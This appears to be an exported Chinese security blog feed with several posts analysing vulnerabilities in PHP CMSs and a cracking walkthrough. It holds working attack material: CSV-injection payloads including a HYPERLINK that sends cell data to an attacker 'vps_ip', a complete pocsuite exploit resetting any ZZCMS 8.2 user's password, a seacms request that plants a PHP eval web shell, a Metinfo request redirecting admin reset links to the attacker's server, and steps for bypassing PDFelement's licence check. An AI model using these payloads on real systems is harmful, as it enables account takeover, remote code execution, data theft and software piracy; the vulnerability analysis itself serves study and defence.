<h5 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h5><p>删除 <code>my.php</code> 后 会要求我们重新安装系统。</p>
<p>在重装系统的最后一步，会直接使用 <code>POST</code> 中的值，来设置 <code>my.php</code> 的内容，同时 , 访问 <code>install.php</code> 时，是不会调用参数过滤的函数的</p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125785718sgkkrmoe.png" alt="paste image"></p>
<p>所以可以注入 <code>php</code> 代码，<strong>getshell</strong></p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125731744om4jbkwp.png" alt="paste image"></p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125749128od3petc5.png" alt="paste image"></p>
]]></content>
      
        <categories>
            
            <category> 代码审计 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[csv注入漏洞原理&&实战]]></title>
      <url>/2018/03/11/csv_inject.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  为了找工作，巩固巩固知识。本文会介绍 <code>csv</code> 注入漏洞的原理，最后给出一个示例。 </p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>在 <code>csv</code> 文件 和 <code>xlsx</code> 文件中的每一项的值如果是 <code>=, @, +, -</code> 就会被 <code>excel</code> 识别为一个 公式， 此时可以注入 <strong>系统命令</strong> 实现 命令执行。</p>
<p>常用 <code>payload</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">=cmd|&apos;/c calc&apos;!A0    # 弹计算器</div><div class="line">=MSEXCEL|&apos;\..\..\..\Windows\System32\cmd.exe /c calc.exe&apos;!&apos;&apos;  # 弹计算器</div><div class="line"></div><div class="line">=HYPERLINK(&quot;http://vps_ip?test=&quot;&amp;A2&amp;A3,&quot;Error: Please click me!&quot;)  # 发起 http请求 获取数据</div></pre></td></tr></table></figure>
<p> <strong>示例</strong></p>
<p>目标网址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.starrysurvey.com/</div></pre></td></tr></table></figure>
<p>首先自己创建一个在线报表，然后 让用户 填入  <code>payload</code> </p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521124708730fvnx7nrm.png" alt="paste image"></p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/15211247176246q903c5h.png" alt="paste image"></p>
<p>打开导出的 xlsx 文件， 可以看到没被过滤，成功注入了表达式。 双击它在点出去（貌似这样才能使 excel 识别这个为 一个公式， excel 2007， 2010 测试） 即可打开 计算器</p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521124783876fkeca9js.png" alt="paste image"></p>
<p>真正用于渗透测试的话，可以借助 <code>powershell</code> 等手段 植入后门。</p>
<p><strong>参考</strong></p>
<p><a href="http://www.freebuf.com/articles/system/160797.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/160797.html</a><br><a href="https://www.contextis.com/blog/comma-separated-vulnerabilities" target="_blank" rel="external">https://www.contextis.com/blog/comma-separated-vulnerabilities</a><br><a href="http://blog.knownsec.com/2016/05/csv-injection-vulnerability/" target="_blank" rel="external">http://blog.knownsec.com/2016/05/csv-injection-vulnerability/</a></p>
]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> csv注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ZZCMS8.2 用户密码重置漏洞]]></title>
      <url>/2018/03/07/zzcms_8_2_rest_user_passwd.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一个找回密码处的逻辑漏洞， 还是有点意思的。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先是定位找回密码功能对应的代码位置，使用找回密码的功能，然后抓包即可</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520411700740whbjpyux.png?imageslim" alt="paste image"></p>
<p>下面去 <code>getpassword.php</code> 里面看看， 首先包含了一些文件</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15204117674606tv8u2l0.png?imageslim" alt="paste image"></p>
<p>在 <code>conn.php</code> 中，包含了 <code>stopsqlin.php</code> 会对参数进行过滤操作。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520411794040jozslsh6.png?imageslim" alt="paste image"></p>
<p><code>stopsqlin.php</code> 中对参数的过滤</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15204118876961npsbtjm.png?imageslim" alt="paste image"></p>
<p>回到<code>getpassword.php</code>  , 文件后面就开始进入 密码找回 功能的业务逻辑了。</p>
<p>找回密码功能分为3个部分</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520412045236pai01o80.png?imageslim" alt="paste image"></p>
<p>正常走一遍流程，期间用 <code>burp</code> 抓包</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520412141687h9hvdcrp.png?imageslim" alt="paste image"><br>可以看到根据 <code>action</code> 来识别已经进行到了哪一步。以这个为线索去看代码，逻辑就非常清晰了。</p>
<p>我们直接来看看最后一步的代码</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520412238609k9mz50op.png?imageslim" alt="paste image"></p>
<p>判断非常的简单， 只要 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$action == &quot;step3&quot; &amp;&amp; @$_SESSION[&apos;username&apos;] != &apos;&apos;</div></pre></td></tr></table></figure>
<p>接下来找 哪里修改了 <code>$_SESSION[&#39;username&#39;]</code>, 发现在 <code>step1</code> 的时候，用 <code>POST</code> 参数修改  <code>$_SESSION[&#39;username&#39;]</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520412374515fl3c7xd2.png?imageslim" alt="paste image"></p>
<p>于是利用思路</p>
<ul>
<li>首先进入 <code>step1</code> , 设置 <code>$_SESSION[&#39;username&#39;]</code>为需要重置的用户名</li>
<li>然后进入 <code>step3</code> , 设置密码即可</li>
</ul>
<p>同时该程序还有一个小问题，<code>check_username_ajax.php</code>  没有做 检查， 我们可以用它来枚举用户</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520414950013gzfstbq5.png?imageslim" alt="paste image"></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520414979312yttgq7lt.png?imageslim" alt="paste image"></p>
<p>用 <code>pocsuite</code> 写的 <code>exp</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">import string</div><div class="line">import random</div><div class="line">import time</div><div class="line">from pocsuite.net import req</div><div class="line">from pocsuite.poc import POCBase, Output</div><div class="line">from pocsuite.utils import register</div><div class="line">from pocsuite.lib.core.data import logger</div><div class="line"></div><div class="line">class HackZZcms(POCBase):</div><div class="line">    name = &apos;ZZcms ZZCMS8.2任意用户密码修改&apos;</div><div class="line">    vulID = &apos;1&apos;</div><div class="line">    author = [&apos;hac425&apos;]</div><div class="line">    vulType = &apos;remote-pass-change&apos;</div><div class="line">    version = &apos;1.0&apos;    # default version: 1.0</div><div class="line">    references = [&apos;http://blog.hac425.top/2018/03/07/zzcms_8_2_rest_user_passwd.html&apos;]</div><div class="line">    desc = &apos;&apos;&apos;ZZcms ZZCMS8.2任意用户密码修改&apos;&apos;&apos;</div><div class="line"></div><div class="line">    vulDate = &apos;***&apos;</div><div class="line">    createDate = &apos;2018-03-07&apos;</div><div class="line">    updateDate = &apos;2018-03-07&apos;</div><div class="line"></div><div class="line">    appName = &apos;ZZcms&apos;</div><div class="line">    appVersion = &apos;8.2&apos;</div><div class="line">    appPowerLink = &apos;http://www.zzcms.net/&apos;</div><div class="line">    samples = [&apos;&apos;]</div><div class="line"></div><div class="line">    # 检查用户名是否存在</div><div class="line">    def _check_username(self, username):</div><div class="line">        target = self.url + &quot;/ajax/check_username_ajax.php?id=&quot; + username</div><div class="line">        headers = &#123;</div><div class="line">            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;&#125;</div><div class="line"></div><div class="line">        cont = req.get(target, headers=headers).content</div><div class="line">        if &quot;用户名不存在&quot; in cont:</div><div class="line">            return False </div><div class="line">        return True</div><div class="line"></div><div class="line">    # 使得 SESSION 中存放好我们需要改密码的 用户名， 同时返回 PHPSESSID</div><div class="line">    def _get_session(self, url, username):</div><div class="line">        target = url + &quot;/one/getpassword.php&quot;</div><div class="line">        headers = &#123;&quot;Origin&quot;: url,</div><div class="line">            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;&#125;</div><div class="line">        data = &#123;&quot;username&quot;: username, &quot;username2&quot;: &quot;yes&quot;, &quot;action&quot;: &quot;step1&quot;,</div><div class="line">            &quot;yzm&quot;: &quot;22&quot;, &quot;yzm2&quot;: &quot;yes&quot;, &quot;submit&quot;: &quot;\xe4\xb8\x8b\xe4\xb8\x80\xe6\xad\xa5&quot;&#125;</div><div class="line"></div><div class="line">        res = req.post(target, headers=headers, data=data)</div><div class="line">        return res.cookies.get(&quot;PHPSESSID&quot;)</div><div class="line"></div><div class="line">    # 重置密码</div><div class="line">    def _reset_passwd(self, url, password, phpsession):</div><div class="line">        target = url + &quot;/one/getpassword.php&quot;</div><div class="line">        cookies = &#123;&quot;PHPSESSID&quot;: phpsession&#125;</div><div class="line">        headers = &#123;&quot;Origin&quot;: url,  &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;&#125;</div><div class="line">        data=&#123;&quot;password&quot;: password, &quot;password2&quot;: &quot;yes&quot;, &quot;action&quot;: &quot;step3&quot;, &quot;PwdConfirm&quot;: password, &quot;PwdConfirm2&quot;: &quot;yes&quot;, &quot;submit&quot;: &quot;\xe7\xa1\xae\xe5\xae\x9a&quot;&#125;</div><div class="line">        res = req.post(target, headers=headers, cookies=cookies, data=data)</div><div class="line">        # print res.content</div><div class="line">        return res.content</div><div class="line"></div><div class="line">    def _attack(self):</div><div class="line">        &quot;&quot;&quot;attack mode&quot;&quot;&quot;</div><div class="line">        return self._verify()</div><div class="line"></div><div class="line"></div><div class="line">    def _verify(self):</div><div class="line">        &quot;&quot;&quot;verify mode&quot;&quot;&quot;</div><div class="line">        # print self.params</div><div class="line">        result = &#123;&#125;</div><div class="line">        username = self.params[&apos;username&apos;]</div><div class="line">        password = self.params[&apos;password&apos;]</div><div class="line">        </div><div class="line">        if self._check_username(username):</div><div class="line">            phpsession = self._get_session(self.url, username)</div><div class="line">            if &quot;重置密码成功&quot; in self._reset_passwd(self.url, password, phpsession):</div><div class="line">                result[&apos;VerifyInfo&apos;] = &#123;&#125;</div><div class="line">                result[&apos;VerifyInfo&apos;][&apos;URL&apos;] = self.url    </div><div class="line">        else:</div><div class="line">            logger.error(&quot;无该账号&quot;)</div><div class="line">        return self.parse_output(result)</div><div class="line"></div><div class="line">    def parse_output(self, result):</div><div class="line">        output = Output(self)</div><div class="line">        if result:</div><div class="line">            output.success(result)</div><div class="line">        else:</div><div class="line">            output.fail(result)</div><div class="line">        return output</div><div class="line"></div><div class="line"></div><div class="line">register(HackZZcms)</div></pre></td></tr></table></figure>
<p>使用示例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pocsuite -r pocsuite_pocs/zzcms/zzcms_8_2_reset_any_user_passwd.py  -u http://hack.zzcms.top/ --extra-params &quot;&#123;&apos;username&apos;: &apos;test&apos;, &apos;password&apos;:&apos;xxxxdsg&apos;&#125;&quot;</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520419980366lp6etpo8.png?imageslim" alt="paste image"></p>
<p><strong>参考</strong></p>
<p><a href="http://getpass.cn/2018/03/06/zzcms-Any-user-password-changes-loopholes-code-points/" target="_blank" rel="external">http://getpass.cn/2018/03/06/zzcms-Any-user-password-changes-loopholes-code-points/</a></p>
]]></content>
      
        <categories>
            
            <category> 代码审计 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 逻辑漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[seacms 6.45 命令执行漏洞分析]]></title>
      <url>/2018/03/06/seacms_6_45_rce.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是一个比较老的漏洞了，不过漏洞原理还是挺有意思的。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>漏洞位于 <code>search.php</code> 文件中。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520299296339hokrjh06.png?imageslim" alt="paste image"></p>
<p>首先包含了 <code>common.php</code>, 这个文件里面做了一些初始化工作，其中最重要的是对提交参数的处理。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520299866048ep5z1371.png?imageslim" alt="paste image"></p>
<p>注册提交的参数为系统全局变量，很容易出现变量覆盖漏洞。</p>
<p>下面回到 <code>search.php</code> ， 之后对变量进行处理以及过滤。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520300014270saty241p.png?imageslim" alt="paste image"></p>
<p>然后会 <code>$searchtype</code> 的值来选择渲染内容的模板。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1520300056564gkjm73nb.png?imageslim" alt="paste image"></p>
<p>之后就是对模板文件中的内容进行替换。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1520300332945usbwtfaq.png?imageslim" alt="paste image"></p>
<p>然后进入 <code>$mainClassObj-&gt;parseIf</code> 解析 <code>if</code> 语句<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15203005086449fzxkatp.png?imageslim" alt="paste image"></p>
<p><code>$mainClassObj-&gt;parseIf</code> 最后会调用 <code>eval</code> 解析。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1520301577430g57kywer.png?imageslim" alt="paste image"></p>
<p>我们的目标就是 污染 <code>eval</code> 的参数。</p>
<p>poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">POST /search.php HTTP/1.1</div><div class="line">Host: hack.seacms.top</div><div class="line">Content-Length: 176</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://hack.seacms.top</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</div><div class="line">Referer: http://hack.seacms.top/?XDEBUG_SESSION_START=15261</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: PHPSESSID=clcblhpau94ae8v6mfg5q1iil1; XDEBUG_SESSION=15261</div><div class="line">Connection: close</div><div class="line"></div><div class="line">order=&#125;&#123;end%20if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end%20if&#125;&amp;searchtype=5&amp;searchword=123&amp;func=assert&amp;cmd=fwrite(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php%20@eval($_POST[x])?&gt;&apos;);</div></pre></td></tr></table></figure>
<p>输入这个之后，首先闭合前面一个 <code>{if:&quot;</code>, 后面再单独形成一个 <code>if</code> 标签。</p>
<p>调试看看，完成替换以后，就会形成 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;if:&quot;&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&quot;==&quot;time&quot;&#125;</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520302135754gpeuuggd.png?imageslim" alt="paste image"></p>
<p>然后在 <code>parseIf</code> 提取 <code>if</code>  语句对应标签内容时，可以看到我们的输入被识别成了标签。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1520302590089mokw196q.png?imageslim" alt="paste image"></p>
<p>最后在 <code>eval</code> 时，执行的其实是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(1)print_r($_POST[func]($_POST[cmd]));//)&#123;$ifFlag=true;&#125;else&#123;$ifFlag=false;&#125;</div></pre></td></tr></table></figure>
<p>使用<code>searchtype=5</code> 是为了使用 <code>cascade.html</code> 最为模板，因为这里面才有 <code>if</code> 标签</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520303663308anyh9hsf.png?imageslim" alt="paste image"></p>
<p>而用 <code>order</code> 来传递 <code>payload</code>, 原因在于 <code>order</code> 变量没有做过滤处理，而且 <code>order</code> 的值会用来替换掉  <code>{searchpage:ordername}</code>.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$content = str_replace(&quot;&#123;searchpage:ordername&#125;&quot;,$order,$content);</div></pre></td></tr></table></figure></p>
<p><strong>参考</strong></p>
<p><a href="https://bbs.ichunqiu.com/thread-35085-1-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/thread-35085-1-1.html</a></p>
]]></content>
      
        <categories>
            
            <category> 代码审计 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 变量覆盖 </tag>
            
            <tag> seacms </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Metinfo 5.x 管理员密码重置漏洞]]></title>
      <url>/2018/03/05/metinfo_5x_reset_admin_passwd.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在先知看到了一篇分析该漏洞的文章，复现分析一下，漏洞还是比较有趣的。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先知道是 管理员密码重置时出现的问题，于是抓包，定位到相关的php文件。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15202499658875d61ejbb.png?imageslim" alt="paste image"></p>
<p>首先包含了 <code>../include/common.inc.php</code> ， 在这个文件中可以搞清楚对我们提交参数的处理。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520250081731qf2z266a.png?imageslim" alt="paste image"></p>
<p>把提交的参数注册为变量， 这样的代码非常容易形成变量覆盖漏洞。</p>
<p>在 <code>getpassword.php</code> 中 首先注册提交的参数为变量，然后生成重置密码的连接，最后发送出去。问题就出在发送链接的流程中。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520250234820vfnkm8ny.png?imageslim" alt="paste image"><br>发送时首先通过 <code>jmailsend</code> 发送，如果发送失败，则使用 <code>curl_post</code> 重发一遍。</p>
<p><code>curl_post</code>中会向 <code>met_host:80</code> 发送 <code>POST</code> 数据, 而我们可以利用 变量覆盖 设置  <code>met_host</code> 为我们自己的 <code>vps</code>, 然后我们就可以接收到密码重置连接了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520250322672odi1k23y.png?imageslim" alt="paste image"></p>
<p>下面就是要让程序能进入该流程。</p>
<p>在 <code>jmailsend</code> 中 <code>met_fd_port</code> 为邮件服务器的 端口，我们使用 变量覆盖 设置 <code>met_fd_port</code> 为一个随机端口，就会导致 <code>$mail-&gt;Send()</code> 发送失败 返回 <code>false</code>, 然后就可以进入 <code>curl_post</code>。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1520250485261q69gx3yq.png?imageslim" alt="paste image"></p>
<p>最后的 <code>poc</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">POST /admin/admin/getpassword.php HTTP/1.1</div><div class="line">Host: hack.metinfo.net</div><div class="line">Content-Length: 115</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://hack.metinfo.net</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</div><div class="line">Referer: http://hack.metinfo.net/admin/admin/getpassword.php</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: XDEBUG_SESSION=10334; re_url=http%3A%2F%2Fhack.metinfo.net%2Fadmin%2F</div><div class="line">Connection: close</div><div class="line"></div><div class="line">action=next2&amp;abt_type=2&amp;admin_mobile=admin&amp;submit=%E4%B8%8B%E4%B8%80%E6%AD%A5&amp;met_fd_port=8569&amp;met_host=your_vps_ip</div></pre></td></tr></table></figure>
<p>vps的 80端口就可以接收到</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15202506609037yghahna.png?imageslim" alt="paste image"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>拿到一套程序首先看看对提交数据的处理，如果有 <strong>变量覆盖</strong> 漏洞，就去可能出现漏洞的功能代码里面看看能不能利用 <strong>变量覆盖</strong> 漏洞，一些不好静态看的东西，可以自己测试一下。</p>
<p><strong>参考</strong></p>
<p><a href="https://xianzhi.aliyun.com/forum/topic/2097#toc-0" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/2097#toc-0</a></p>
]]></content>
      
        <categories>
            
            <category> 代码审计 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 变量覆盖 </tag>
            
            <tag> 逻辑漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[c#应用破解实战之PDFelement]]></title>
      <url>/2018/02/03/crack_PDFelement.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在知乎上发现一款不错的 <code>pdf</code> 处理软件 <code>PDFelement</code>，功能比较强大，格式转换，pdf编辑，ocr，在网上搜了一遍没找到能用的破解版，于是自己动手。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>最开始我是拿的 <code>6.0</code> 版本破解的，破解完后发现，这个版本的 <code>bug</code> 特别严重，不能 编辑 <code>pdf</code>（也许是我改坏了， <code>6.4</code>就没问题）, 于是后来又下了最新的 <code>6.4</code>. 老版的还有混淆，新版本连混淆都没有。为了总结更多的经验，先写 <code>6.0</code> 版本的破解，然后写 <code>6.4</code> 的破解。</p>
<p>工具</p>
<ul>
<li>dnSpy  .net 应用反编译，调试工具</li>
<li>de4dot .net 去混淆</li>
</ul>
<p><strong>6.0版本破解</strong></p>
<p>首先安装好，对于应用破解可以搜关键字符串，像这种比较大的程序，一般会有单独一个目录放置语言文件便于多语言的支持。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517643655618dem7rbha.png?imageslim" alt="paste image"></p>
<p>不过该程序的资源文件貌似不是文本格式的，故我放弃了这条路。<br>接着我去分析了 <code>PDFelement.exe</code> ，想看看能不能根据函数名找到关键的函数。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517643819865pk0ze64a.png?imageslim" alt="paste image"><br>发现它里面没有啥东西，估计关键逻辑都在 <code>dll</code> 里面，于是决定调试他，然后在调试的时候去 <code>dll</code> 里面找找。</p>
<p>运行程序，然后用 dnspy 附件上去<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1517644211341z2iwjjrs.png?imageslim" alt="paste image"></p>
<p>然后在 模块 窗口查看加载的 <code>dll</code>,可以在 <code>调试</code> - <code>窗口</code> -<code>模块</code> 调出该窗口<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1517644287010jvaehj92.png?imageslim" alt="paste image"></p>
<p>最后在 <code>PEStudio.PDFElement.Base.dll</code> 里面找到了有意思的函数。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151764444508180snrsc0.png?imageslim" alt="paste image"><br>看这些函数名，估计这里是在注册时，用来校验的函数了。在这里下个断点</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517644596257dtefmpbr.png?imageslim" alt="paste image"><br>然后我们去注册，触发这个逻辑然后看看她是在哪里被调用的</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517644733330ufjfn6r1.png?imageslim" alt="paste image"></p>
<p>断下来后查看调用堆栈信息<br><img src="http://oy9h5q2k4.bkt.clouddn.com/151764477522444w6vgc0.png?imageslim" alt="paste image"><br>转到调用者这里，发现各种跳转，看起来是做了混淆，于是使用 <code>de4dot</code> 去混淆，如果不去混淆的话修改代码保存会出很多的错。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">修改代码的方式很简单，进入方法内部，右键-修改方法，然后按照 `c#` 的语法进行修改即可，最后点击 编译 就可以保存了。</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517644994707601hgrk9.png?imageslim" alt="paste image"><br>对于上面的错，把出错的位置删掉即可（在这里折腾了好久，才发现直接删掉即可）。</p>
<p>为了方便调试分析，把去掉混淆的 <code>dll</code> 替换掉安装目录里面的。</p>
<p>根据参数和其他的特征定位到我们刚刚找到的关键函数<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1517645319157fe2i1snm.png?imageslim" alt="paste image"><br>设下断点，断下来后往上回溯<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15176455213444ixtyafl.png?imageslim" alt="paste image"></p>
<p>我们需要的逻辑就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">if (AgentMgr.ProductType == ProductType.Professional &amp;&amp; this.method_7(text, text2))</div><div class="line">				&#123;</div><div class="line">					this.lblError.Visible = true;</div><div class="line">					this.lblError.Text = CommonLanguages.Info_StandardCodeTip;</div><div class="line">					this.lblError.Tag = &quot;Professional&quot;;</div><div class="line">					base.Height = this.int_1 + this.int_0;</div><div class="line">					return;</div><div class="line">				&#125;</div></pre></td></tr></table></figure></p>
<p> 那么把其他的去掉，如果是前面那个逻辑正确的话，会提示是 <code>5.x</code> 版本的验证码。</p>
<p> 那么就把那个删掉<br> <img src="http://oy9h5q2k4.bkt.clouddn.com/15176457565367n4ro44z.png?imageslim" alt="paste image"></p>
